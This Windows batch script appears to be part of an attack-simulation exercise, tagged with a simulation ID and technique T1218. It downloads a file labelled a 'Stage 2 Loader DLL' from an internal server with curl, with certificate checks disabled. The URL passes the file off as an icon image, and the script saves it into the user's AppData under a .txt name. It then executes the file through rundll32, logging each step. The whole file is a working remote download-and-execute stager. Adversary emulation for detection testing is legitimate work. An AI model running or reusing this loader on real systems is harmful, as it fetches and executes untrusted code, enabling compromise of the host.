@echo off
SETLOCAL EnableDelayedExpansion

REM ---- Placeholder constant declarations (random-named SET variables) ----
SET x1=%APPDATA%\11168\a0ec9341
SET x2=521104cb.txt
SET x3=https://10.0.0.49/stage/2/icon.png?11168-7
SET x4=BALAM-S2B
SET x5=11168
SET x6=7
SET x7=%PUBLIC%\\macula-simulations.log

REM ---- Capture timestamp once ----
SET tsvar=!DATE!/!TIME!

REM ---- Determine output and log paths early ----
SET outdir=!x1!
SET outfile=!x2!
SET heartbeat_url=!x3!
SET agent=!x4!
SET simid=!x5!
SET logfile=!x7!

REM ---- Ensure log directory exists (quietly) ----
if not exist "!logfile!\.." mkdir "!logfile!\.." 2>nul

REM ---- Debug: heartbeat start ----
echo [!tsvar!][DEBUG][!agent!][!simid!]: heartbeat_start>> "!logfile!" 2>nul

REM ---- Heartbeat fetch: download Stage 2 Loader DLL ----
curl -k -s -o "!outdir!\!outfile!" "!heartbeat_url!"
SET curl_err=%ERRORLEVEL%

REM ---- Debug: heartbeat complete ----
echo [!tsvar!][DEBUG][!agent!][!simid!]: heartbeat_complete>> "!logfile!" 2>nul

REM ---- Evaluate curl result ----
SET result=OK
SET error_detail=
if not !curl_err!==0 (
    SET result=FAIL
    SET error_detail=CURL_FAIL
    echo [!tsvar!][DEBUG][!agent!][!simid!]: curl_error=!curl_err!>> "!logfile!" 2>nul
)

REM ---- Debug: chdir start ----
echo [!tsvar!][DEBUG][!agent!][!simid!]: chdir_start>> "!logfile!" 2>nul

REM ---- Change working directory to output directory ----
cd /d "!outdir!" >nul 2>&1
SET cd_err=%ERRORLEVEL%

REM ---- Debug: chdir result ----
echo [!tsvar!][DEBUG][!agent!][!simid!]: chdir_result=!cd_err!>> "!logfile!" 2>nul

REM ---- Debug: rundll32 start ----
echo [!tsvar!][DEBUG][!agent!][!simid!]: rundll32_start>> "!logfile!" 2>nul

REM ---- Invoke the downloaded DLL via rundll32 (RunDLLW entry point) ----
rundll32.exe "!outfile!", RunDLLW

REM ---- Debug: rundll32 invoked (no wait) ----
echo [!tsvar!][DEBUG][!agent!][!simid!]: rundll32_invoked>> "!logfile!" 2>nul

REM ---- TTP log line (System Binary Proxy Execution) ----
echo [!tsvar!][TTP][!agent!][!simid!]: T1218^|System Binary Proxy Execution=[!result!]:!error_detail!>> "!logfile!" 2>nul

ENDLOCAL